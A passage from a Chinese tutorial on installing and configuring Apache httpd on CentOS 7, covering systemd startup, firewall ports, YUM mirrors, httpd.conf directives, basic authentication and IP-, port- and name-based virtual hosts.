title="6、配置Apache服务开机自启"></a>6、配置Apache服务开机自启</h4><p>为Apache服务编写脚本。</p><pre><code>vim /usr/lib/systemd/system/httpd.service[Unit]Description=The Apache HTTP ServerAfter=network.target remote-fs.target nss-lookup.targetDocumentation=man:httpd(8)Documentation=man:apachectl(8)[Service]Type=forkingEnviromentFile=/etc/httpd/httpd.confExecStart=/usr/local/apache2/bin/apachectl -k startExecRestart=/usr/local/apache2/bin/apachectl -k restartExecStop=/usr/local/apache2/bin/apachectl -k stopKillSignal=SIGCONTPrivateTmp=true[Install]WantedBy=multi-user.target</code></pre><p>启动Apache服务，并加入开机自启。</p><pre><code>systemctl  start  httpdsystemctl  enable httpd</code></pre><h4 id="7、配置防火墙"><a href="#7、配置防火墙" class="headerlink" title="7、配置防火墙"></a>7、配置防火墙</h4><p>在Apache服务启动后，为了让用户能够访问服务器上的web服务，需要对防火墙添加一条规则来允许用户访问服务器的80端口。</p><pre><code>firewall-cmd  --add-port=80/tcp --permanent firewall-cmd  --reload</code></pre><p>在浏览器使用“http://&lt;服务器IP&gt;”进行访问。</p><h3 id="2-2-使用YUM安装与运行"><a href="#2-2-使用YUM安装与运行" class="headerlink" title="2.2    使用YUM安装与运行"></a>2.2    使用YUM安装与运行</h3><h4 id="1、配置国内YUM源"><a href="#1、配置国内YUM源" class="headerlink" title="1、配置国内YUM源"></a>1、配置国内YUM源</h4><p>首先备份/etc/yum.repos.d/CentOS-Base.repo</p><pre><code>mkdir  /etc/yum.repos.d/bak mv     /etc/yum.repos.d/CentOS-*   /etc/yum.repos.d/bak</code></pre><p>下载新的YUM源配置文件</p><pre><code>wget -P /etc/yum.repos.d/ http://mirrors.163.com/.help/CentOS7-Base-163.repo</code></pre><h4 id="2、使用YUM安装Apache"><a href="#2、使用YUM安装Apache" class="headerlink" title="2、使用YUM安装Apache"></a>2、使用YUM安装Apache</h4><p>使用YUM安装Apache</p><pre><code>yum -y install httpd</code></pre><p>检查是否正确安装</p><pre><code>[root@server1 ~]# rpm -qa |grep httpdhttpd-tools-2.4.6-97.el7.centos.x86_64httpd-2.4.6-97.el7.centos.x86_64</code></pre><p>查看使用YUM安装Apache后生成的文件和目录。</p><pre><code>rpm  -ql httpd</code></pre><h4 id="3、使用YUM安装Apache后的目录结构"><a href="#3、使用YUM安装Apache后的目录结构" class="headerlink" title="3、使用YUM安装Apache后的目录结构"></a>3、使用YUM安装Apache后的目录结构</h4><table><thead><tr><th>目录名</th><th>内容</th></tr></thead><tbody><tr><td>/var/www/</td><td>存放网站内容的目录</td></tr><tr><td>/etc/httpd/conf/httpd.conf</td><td>Apache主配置文件</td></tr><tr><td>/var/www/html</td><td>默认主服务器文档的根目录</td></tr><tr><td>/var/www/cgi-bin</td><td>默认CGI文件</td></tr><tr><td>/var/log/httpd/</td><td>日志文件存放位置</td></tr><tr><td>/etc/httpd/modules</td><td>动态加载模块所在位置</td></tr><tr><td>/usr/sbin/httpd</td><td>Apache执行程序</td></tr><tr><td>/usr/share/doc/httpd-2.4.6</td><td>配置文件的模板</td></tr></tbody></table><h4 id="4、配置Apache服务开机自启"><a href="#4、配置Apache服务开机自启" class="headerlink" title="4、配置Apache服务开机自启"></a>4、配置Apache服务开机自启</h4><p>配置Apache开机自启</p><pre><code>systemctl  enable   httpd</code></pre><p>启动Apache服务</p><pre><code>systemctl  start  httpd</code></pre><h4 id="5、配置防火墙"><a href="#5、配置防火墙" class="headerlink" title="5、配置防火墙"></a>5、配置防火墙</h4><p>在Apache服务启动后，为了让用户能够访问服务器上的web服务，需要对防火墙添加一条规则来允许用户访问服务器的80端口。</p><pre><code>firewall-cmd  --add-port=80/tcp --permanent firewall-cmd  --reload</code></pre><p>在浏览器使用“http://&lt;服务器IP&gt;”进行访问。</p><h2 id="三、Apache的配置与管理"><a href="#三、Apache的配置与管理" class="headerlink" title="三、Apache的配置与管理"></a>三、Apache的配置与管理</h2><h3 id="3-1-Apache主配置文件"><a href="#3-1-Apache主配置文件" class="headerlink" title="3.1    Apache主配置文件"></a>3.1    Apache主配置文件</h3><p>在使用YUM 安装Apache服务后，在/etc/httpd/conf目录下包含了主配置文件httpd.conf；在/etc/httpd/conf.d/目录下包含了一些独立出来的配置文件；在/usr/share/doc/httpd-2.4.6目录下包含了一些常用配置为模板。</p><h4 id="1、全局配置部分"><a href="#1、全局配置部分" class="headerlink" title="1、全局配置部分"></a>1、全局配置部分</h4><pre><code>#Apache安装目录ServerRoot "/etc/httpd"#指定监听端口Listen 80#把conf.modules.d目录下的以“*.conf”结尾的配置文件合并到主配置文件Include conf.modules.d/*.conf#指定运行Apache程序的用户User apacheGroup apache</code></pre><h4 id="2、主服务配置部分"><a href="#2、主服务配置部分" class="headerlink" title="2、主服务配置部分"></a>2、主服务配置部分</h4><pre><code># 'Main' server configuration#网站管理员邮箱ServerAdmin root@localhost#配置主站点域名#ServerName www.example.com:80#配置全局目录默认规则，默认拒绝所有访问&lt;Directory /&gt;    AllowOverride none    Require all denied&lt;/Directory&gt;    #Directory一般用于对指定目录进行权限控制#指定网站主目录存放位置DocumentRoot "/var/www/html"#配置/var/www/目录的权限&lt;Directory "/var/www"&gt;    AllowOverride None    # Allow open access:    Require all granted&lt;/Directory&gt;#配置/var/www/html/目录的权限&lt;Directory "/var/www/html"&gt;    Options Indexes FollowSymLinks    AllowOverride None    Require all granted&lt;/Directory&gt;#IfModuole标签其作用是先检查当前模块是否已经加载，若已经加载，则标签中的配置有效，若没有加载，则标签中的配置无效。#默认索引页面是index.html&lt;IfModule dir_module&gt;    DirectoryIndex index.html&lt;/IfModule&gt;#&lt;Files&gt;指令提供了基于文件名的访问控制，类似于&lt;Directory&gt;和&lt;Location&gt;指令&lt;Files ".ht*"&gt;    Require all denied&lt;/Files&gt;#配置主站点错误日志位置ErrorLog "logs/error_log"#配置日志级别LogLevel warn#IfModuole标签其作用是先检查当前模块是否已经加载，若已经加载，则标签中的配置有效，若没有加载，则标签中的配置无效。&lt;IfModule log_config_module&gt;    LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined    LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common    &lt;IfModule logio_module&gt;      # You need to enable mod_logio.c to use %I and %O      LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio    &lt;/IfModule&gt;    CustomLog "logs/access_log" combined&lt;/IfModule&gt;#把conf.d目录下以“.conf”结尾的配置文件合并到主配置文件。IncludeOptional conf.d/*.conf</code></pre><h3 id="3、关于配置文件一些重要的指令"><a href="#3、关于配置文件一些重要的指令" class="headerlink" title="3、关于配置文件一些重要的指令"></a>3、关于配置文件一些重要的指令</h3><h4 id="（1）Options"><a href="#（1）Options" class="headerlink" title="（1）Options"></a><strong>（1）Options</strong></h4><p>该指令用于控制特定目录中可用的服务器功能，选项可以设置为None，表示没有启用任何额外的功能，还可以设置以下一项或多项：</p><pre><code>Options选项用于定义目录使用哪些特性，包括Indexes、MultiViews和ExecCGI等Indexes             允许目录浏览，Apache以超文本形式返回目录中的文件和子目录列表MultiViews          允许内容协商的多重视图MultiViews其实是Apache的一个智能特性。当客户访问目录 中一个不存在的对象时，如访问“http://192.168.16.177/icons/a”，则Apache会查找这个目录下所有a.*文件。由于 icons目录下存在a.gif文件，因此Apache会将a.gif文件返回给客户，而不是返回出错信息All               All包含了除MultiViews之外的所有特性，如果没有Options语句，默认为AllExecCGI           允许在该目录下执行CGI脚本FollowSymLinks    可以在该目录中使用符号连接（软连接）Includes          允许服务器端包含功能，准许SSIIncludesNoExec       允许服务器端包含功能，但禁用执行CGI脚本SymLinksIfOwnerMatch      在该目录中仅仅跟踪本站点内的链接</code></pre><h4 id="（2）require"><a href="#（2）require" class="headerlink" title="（2）require"></a>（2）require</h4><p>该指令为特定的目录设置目录访问控制权限。</p><pre><code>    #AllowOverride 决定是否读取目录中的.htaccess文件        #All：表示可以读取.htaccess文件的内容，修改原来的访问权限。        #None：表示不读取.htaccess文件，权限由httpd.conf统一控制。    #Require all denied：表示禁止所有请求访问资源，此配置表示禁止访问web服务器的任何目录    #Require all granted：表示允许所有请求访问资源。Require是apache2.4版本的一个新特性    #Require ip IP地址：允许某个IP访问    #Require not ip IP地址：拒绝某个IP访问    #Require host 主机名：允许某个主机访问    #Require not host 主机名：拒绝某个主机访问</code></pre><p>（3）</p><p>该指令用于指定 .htaccess文件中允许的指令类型。   .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。.</p><p>htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p><p>.htaccess的用途范围主要针对当前目录。</p><pre><code>AuthConfig允许使用与认证授权相关的指令(AuthDBMGroupFile, AuthDBMUserFile, AuthGroupFile, AuthName, AuthType, AuthUserFile, Require, 等)。FileInfo允许使用控制文档类型的指令(DefaultType, ErrorDocument, ForceType, LanguagePriority, SetHandler, SetInputFilter, SetOutputFilter, mod_mime中的 Add* 和Remove* 指令等)、控制文档元数据的指令(Header, RequestHeader, SetEnvIf, SetEnvIfNoCase, BrowserMatch, CookieExpires, CookieDomain, CookieStyle,CookieTracking, CookieName)、mod_rewrite中的指令(RewriteEngine, RewriteOptions, RewriteBase, RewriteCond, RewriteRule)和mod_actions中的Action指令。Indexes允许使用控制目录索引的指令(AddDescription, AddIcon, AddIconByEncoding, AddIconByType, DefaultIcon, DirectoryIndex, FancyIndexing, HeaderName,IndexIgnore, IndexOptions, ReadmeName, 等)。Limit允许使用控制主机访问的指令(Allow, Deny, Order)。Options[=Option,...]允许使用控制指定目录功能的指令(Options和XBitHack)。可以在等号后面附加一个逗号分隔的(无空格的)Options选项列表，用来控制允许Options指令使用哪些选项。</code></pre><h3 id="3-2-基本配置"><a href="#3-2-基本配置" class="headerlink" title="3.2    基本配置"></a>3.2    基本配置</h3><h4 id="1、删除默认欢迎页配置"><a href="#1、删除默认欢迎页配置" class="headerlink" title="1、删除默认欢迎页配置"></a>1、删除默认欢迎页配置</h4><pre><code>rm -rf /etc/httpd/conf.d/welcome.conf </code></pre><h4 id="2、新建主页文件"><a href="#2、新建主页文件" class="headerlink" title="2、新建主页文件"></a>2、新建主页文件</h4><pre><code>echo "My First Page" &gt;/var/www/html/index.html</code></pre><h4 id="3、优化配置"><a href="#3、优化配置" class="headerlink" title="3、优化配置"></a>3、优化配置</h4><p>通过修改配置文件可以优化Apache服务。在/usr/share/doc/httpd-2.4.6目录下有模板文件httpd-default.conf,我们可以拷贝模板文件到/etc/httpd/conf.d/目录下，进行修改：</p><pre><code>[root@server1 ~]# cp /usr/share/doc/httpd-2.4.6/httpd-default.conf /etc/httpd/conf.d/[root@server1 ~]# vim /etc/httpd/conf.d/httpd-default.conf Timeout 60#不论接受或发送，当持续连接等待超过60s时就会中断此连接。KeepAlive On#是否持续连接，设置为On表示一次连接允许多次数据传输。MaxKeepAliveRequests 100#限制最大传输速度，0代表不设置。KeepAliveTimeout 5#该连接在最后一次传输后等待延迟的秒数AccessFileName .htaccess#定义每个目录下访问控制文件名。默认为。htaccessServerTokens Full#在出现错误提示页面的时候是否显示服务器操作系统名称，ServerTokens Prod为不显示，ServerSignature Off#在页面产生错误时是否显示服务器版本信息。HostnameLookups Off#开启此功能后，在日志中会记录主机名。该功能需要进行DNS反向解析，会增加服务器负载，不建议开启重启Apache服务使配置文效systemctl restart httpd</code></pre><h3 id="3-3-身份认证"><a href="#3-3-身份认证" class="headerlink" title="3.3    身份认证"></a>3.3    身份认证</h3><p>当网站设置了隐私内容时，或许网站不希望对所有人开放时，可以使用Apache提供的身份验证功能来指定允许浏览网站的用户。</p><h4 id="1、创建需要保护的站点"><a href="#1、创建需要保护的站点" class="headerlink" title="1、创建需要保护的站点"></a>1、创建需要保护的站点</h4><pre><code>[root@server1 ~]# mkdir /var/www/html/secret[root@server1 ~]# echo "This is secret page" &gt; /var/www/html/secret/index.html</code></pre><h4 id="2、创建密码文件"><a href="#2、创建密码文件" class="headerlink" title="2、创建密码文件"></a>2、创建密码文件</h4><p>首先需要在服务器上创建一个密码文件，此文件应该放置在无法通过web访问的位置，以免密码泄露。</p><pre><code>[root@server1 ~]# mkdir   /etc/httpd/passwd[root@server1 ~]# htpasswd -c /etc/httpd/passwd/passwords user1New password: Re-type new password: Adding password for user user1[root@server1 ~]# htpasswd  /etc/httpd/passwd/passwords user2New password: Re-type new password: Adding password for user user2</code></pre><h4 id="3、修改Apache配置文件以支持基本身份验证"><a href="#3、修改Apache配置文件以支持基本身份验证" class="headerlink" title="3、修改Apache配置文件以支持基本身份验证"></a>3、修改Apache配置文件以支持基本身份验证</h4><pre><code>[root@server1 ~]# vim /etc/httpd/conf.d/secret.conf&lt;Directory "/var/www/html/secret"&gt;AuthType BasicAuthName "please enter your name &amp; passwd"AuthBasicProvider fileAuthUserFile /etc/httpd/passwd/passwordsRequire valid-user&lt;/Directory&gt;</code></pre><h4 id="4、验证配置"><a href="#4、验证配置" class="headerlink" title="4、验证配置"></a>4、验证配置</h4><p>重新启动Apache使配置生效</p><pre><code>[root@server1 ~]# systemctl restart httpd</code></pre><p>在浏览器地址栏输入“http://&lt;服务器IP&gt;/secret/”</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210423015931319.png" alt="image-20210423015931319"></p><h3 id="3-4-虚拟主机"><a href="#3-4-虚拟主机" class="headerlink" title="3.4    虚拟主机"></a>3.4    虚拟主机</h3><p>通常为了节省资源，我们会在一台主机上部署多个站点，并且希望各个站点之间相互独立，互不影响，且对用户透明。这时可以通过配置“虚拟主机”来实现。虚拟主机可以实现在一台服务器上同时运行多个站点。</p><p>虚拟主机的实现方式有以下3种：</p><pre><code>基于IP地址的虚拟主机，即需要为每一个站点指定一个不同的IP地址。基于域名的虚拟主机，即每一个域名对应一个站点（IP地址相同，端口相同）基于端口的虚拟主机，即每一个端口对应一个站点（IP地址相同，域名相同）</code></pre><p>准备工作：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/httpd/conf/httpd.conf</span> <span class="token comment" spellcheck="true">#Listen 80         # 将这行注释掉</span> <span class="token comment" spellcheck="true">#DocumentRoot "/var/www/html"        # 将这行注释掉</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># setenforce 0                #关闭selinux</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl stop firewalld    #关闭防火墙</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-Apache基于IP的虚拟主机配置"><a href="#1-Apache基于IP的虚拟主机配置" class="headerlink" title="1. Apache基于IP的虚拟主机配置"></a>1. Apache基于IP的虚拟主机配置</h4><p><strong>第一步：</strong>使用ifconfig设置3个虚拟ip</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig ens33:1 192.168.2.101/24</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig ens33:2 192.168.2.102/24</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig ens33:3 192.168.2.103/24</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig </span>ens33: flags<span class="token operator">=</span>4163<span class="token operator">&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu 1500        inet 192.168.2.9  netmask 255.255.255.0  broadcast 192.168.2.255        inet6 fe80::717e:769b:111f:1c84  prefixlen 64  scopeid 0x20<span class="token operator">&lt;</span>link<span class="token operator">></span>        ether 00:0c:29:8a:f6:6c  txqueuelen 1000  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>        RX packets 592725  bytes 874139447 <span class="token punctuation">(</span>833.6 MiB<span class="token punctuation">)</span>        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 64920  bytes 4476719 <span class="token punctuation">(</span>4.2 MiB<span class="token punctuation">)</span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens33:1: flags<span class="token operator">=</span>4163<span class="token operator">&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu 1500        inet 192.168.2.101  netmask 255.255.255.0  broadcast 192.168.2.255        ether 00:0c:29:8a:f6:6c  txqueuelen 1000  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>ens33:2: flags<span class="token operator">=</span>4163<span class="token operator">&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu 1500        inet 192.168.2.102  netmask 255.255.255.0  broadcast 192.168.2.255        ether 00:0c:29:8a:f6:6c  txqueuelen 1000  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>ens33:3: flags<span class="token operator">=</span>4163<span class="token operator">&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu 1500        inet 192.168.2.103  netmask 255.255.255.0  broadcast 192.168.2.255        ether 00:0c:29:8a:f6:6c  txqueuelen 1000  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第二步：</strong>建立虚拟主机存放网页的根目录，并创建首页文件index.html</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mkdir /var/www/10{1..3}</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.101">/var/www/101/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.102">/var/www/102/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.103">/var/www/103/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第三步：</strong>编辑虚拟主机配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/httpd/conf.d/ip.conf</span>Listen 192.168.2.101:80Listen 192.168.2.102:80Listen 192.168.2.103:80<span class="token operator">&lt;</span>VirtualHost 192.168.2.101:80<span class="token operator">></span>    DocumentRoot /var/www/101/      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/101/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted      <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.102:80<span class="token operator">></span>    DocumentRoot /var/www/102/      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/102/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.103:80<span class="token operator">></span>    DocumentRoot /var/www/103/      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/103/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数介绍：</p><blockquote><p>虚拟主机配置格式：<br>&lt;VirtualHost 主机ip:端口&gt;<br>配置内容<br></p><p>指定虚拟主机使用的域名<br>ServerName 域名</p><p>指定虚拟主机的主目录<br>DocumentRoot 目录</p><p>虚拟目录的格式：<br>&lt;Directory 目录的路径&gt;<br>目录相关的配置参数和指令<br></p><p>Options Indexes FollowSymLinks –找不到主页时，以目录的方式呈现，并允许链接到网站根目录以外</p><p>是否允许.htaccess文件覆盖httpd.conf文件中关于虚拟主机目录的配置。<br>AllowOverride None # 不使用<br>AllowOverride all # 使用</p><p>允许、拒绝所有访问指令<br>Require all granted # 允许<br>Require all denied # 拒绝</p></blockquote><p><strong>第六步：</strong>启动服务并测试</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart httpd</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.101</span>192.168.2.101<span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.102</span>192.168.2.102<span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.103</span>192.168.2.103<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-Apache基于端口的虚拟主机配置"><a href="#2-Apache基于端口的虚拟主机配置" class="headerlink" title="2. Apache基于端口的虚拟主机配置"></a>2. Apache基于端口的虚拟主机配置</h4><p><strong>第一步：</strong>使用ifconfig设置1个虚拟ip</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig ens33:0 192.168.2.100/24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第二步：</strong>建立虚拟主机存放网页的根目录，并创建首页文件index.html</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mkdir /var/www/800{1..3}</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "port 8001" > /var/www/8001/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "port 8002" > /var/www/8002/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "port 8003" > /var/www/8003/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第三步：</strong>创建基于端口的虚拟主机配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /usr/local/apache2/conf/httpd.conf      --文件末尾加入以下配置</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/httpd/conf.d/port.conf</span>Listen 192.168.2.100:8001Listen 192.168.2.100:8002Listen 192.168.2.100:8003<span class="token operator">&lt;</span>VirtualHost 192.168.2.100:8001<span class="token operator">></span>    DocumentRoot <span class="token string">"/var/www/8001/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/8001/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.100:8002<span class="token operator">></span>    DocumentRoot <span class="token string">"/var/www/8002/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/8002/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.100:8003<span class="token operator">></span>    DocumentRoot <span class="token string">"/var/www/8003/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/8003/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第五步：</strong>启动服务并测试</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart httpd</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.100:8001</span>port 8001<span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.100:8002</span>port 8002<span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># curl 192.168.2.100:8003</span>port 8003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-Apache基于域名的虚拟主机配置"><a href="#3-Apache基于域名的虚拟主机配置" class="headerlink" title="3. Apache基于域名的虚拟主机配置"></a>3. Apache基于域名的虚拟主机配置</h4><p><strong>第一步：</strong>使用ifconfig设置1个虚拟ip</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ifconfig ens33:4 192.168.2.99/24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第二步：</strong>配置主机的hosts文件，便于测试</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.99  www.aa.com" >> /etc/hosts</span><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.99  www.bb.com" >> /etc/hosts</span><span class="token punctuation">[</span>root@Apache ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "192.168.2.99  www.cc.com" >> /etc/hosts</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第三步：</strong>建立虚拟主机存放网页的根目录，并创建首页文件index.html</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mkdir /var/www/{aa,bb,cc}</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "www.aa.com" > /var/www/aa/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "www.bb.com" > /var/www/bb/index.html</span><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "www.cc.com" > /var/www/cc/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第四步：</strong>创建基于域名虚拟主机的配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@server1 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/httpd/conf.d/name.conf</span>Listen 192.168.2.99:80<span class="token operator">&lt;</span>VirtualHost 192.168.2.99:80<span class="token operator">></span>      ServerName www.aa.com    DocumentRoot <span class="token string">"/var/www/aa/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/aa/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.99:80<span class="token operator">></span>      ServerName www.bb.com    DocumentRoot <span class="token string">"/var/www/bb/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/bb/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">></span><span class="token operator">&lt;</span>VirtualHost 192.168.2.99:80<span class="token operator">></span>      ServerName www.cc.com    DocumentRoot <span class="token string">"/var/www/cc/"</span>      <span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/cc/"</span><span class="token operator">></span>        Options Indexes FollowSymLinks        AllowOverride None        Require all granted    <span class="token operator">&lt;</span>/Directory<span class="token operator">></span><span class="token 